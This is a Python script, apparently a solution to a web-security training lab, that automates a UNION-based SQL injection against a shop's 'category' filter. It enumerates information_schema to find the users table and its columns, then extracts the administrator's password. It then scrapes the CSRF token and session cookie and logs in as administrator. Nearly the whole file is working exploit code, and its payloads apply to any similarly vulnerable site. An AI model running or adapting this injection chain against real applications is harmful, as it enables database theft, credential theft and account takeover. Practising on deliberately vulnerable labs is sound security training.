#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 16/9/2023
#
# Lab: SQL injection attack, listing the database contents on non-Oracle databases
#
# Steps: 1. Inject payload in 'category' query parameter to retrieve the name of
#           users table
#        2. Adjust the payload to retrieve the names of username and password columns
#        3. Adjust the payload to retrieve the administrator password
#        4. Fetch the login page
#        5. Extract csrf token and session cookie
#        6. Login as the administrator
#        7. Fetch the administrator profile
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########
# change this to your lab URL
url = "https://0a5000d304e6403c83fc237100b800c5.web-security-academy.net"
print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
try:
    # payload to retreive the name of users table
    payload = "' union SELECT table_name, null from information_schema.tables-- -"
    # fetch the page with the injected payload
    injection = requests.get(
        f"{url}/filter?category={payload}")
    # extract the name of users table
    users_table = re.findall("<th>(users_.*)</th>",
                             injection.text)[0]
    print(Fore.WHITE + "1. Injecting a payload to retrieve the name of users table.. " +
          Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + users_table)

    try:
        # payload to retreive the names of username and password columns
        payload = f"' union SELECT column_name, null from information_schema.columns where table_name = '{users_table}'-- -"
        # fetch the page with the injected payload
        injection = requests.get(
            f"{url}/filter?category={payload}")
        # extract the name of username column
        username_column = re.findall(
            "<th>(username_.*)</th>", injection.text)[0]
        # extract the name of password column
        password_column = re.findall(
            "<th>(password_.*)</th>", injection.text)[0]
        print(Fore.WHITE + "2. Adjusting the payload to retrieve the names of username and password columns.. " +
              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + username_column + " | " + password_column)

        try:
            # payload to retreive the password of the administrator
            payload = f"' union SELECT {username_column}, {password_column} from {users_table} where {username_column} = 'administrator'-- -"
            # fetch the page with the injected payload
            injection = requests.get(
                f"{url}/filter?category={payload}")
            # extract the administrator password
            admin_password = re.findall("<td>(.*)</td>",
                                        injection.text)[0]
            print(Fore.WHITE + "3. Adjusting the payload to retrieve the administrator password.. " +
                  Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)

            try:  # fetch login page
                fetch_login = requests.get(f"{url}/login")
                print(Fore.WHITE + "4. Fetching login page.. " + Fore.GREEN + "OK")
                # extract session cookie
                session = fetch_login.cookies.get("session")
                # extract csrf token
                csrf = re.findall("csrf.+value=\"(.+)\"",
                                  fetch_login.content.decode())[0]
                print(
                    Fore.WHITE + "5. Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

                try:  # login in as the administrator
                    data = {
                        "username": "administrator",
                        "password": admin_password,
                        "csrf": csrf
                    }
                    cookies = {
                        "session": session
                    }
                    login = requests.post(f"{url}/login", data,
                                                 cookies=cookies, allow_redirects=False)
                    print(
                        Fore.WHITE + "6. Logging in as the administrator.. " + Fore.GREEN + "OK")
                    # extract new session
                    new_session = login.cookies.get("session")
                    cookies = {
                        "session": new_session
                    }
                    try:  # fetch the administrator profile
                        admin = requests.get(
                            f"{url}/my-account", cookies=cookies)
                        print(
                            Fore.WHITE + "7. Fetching the administrator profile.. " + Fore.GREEN + "OK")
                        print(
                            Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                    except:
                        print(
                            Fore.RED + "[!] Failed to fetch admininstrator profile through exception")
                except:
                    print(
                        Fore.RED + "[!] Failed to login as the administrator through exception")
            except:
                print(
                    Fore.RED + "[!] Failed to fetch login page through exception")
        except:
            print(
                Fore.RED + "[!] Failed to inject the payload to retrieve the password of the administrator through exception")
    except:
        print(
            Fore.RED + "[!] Failed to inject the payload to retrieve the name of username and password columns through exception")
except:
    print(Fore.RED +
          "[!] Failed to inject the payload to retrieve the name of users table through exception")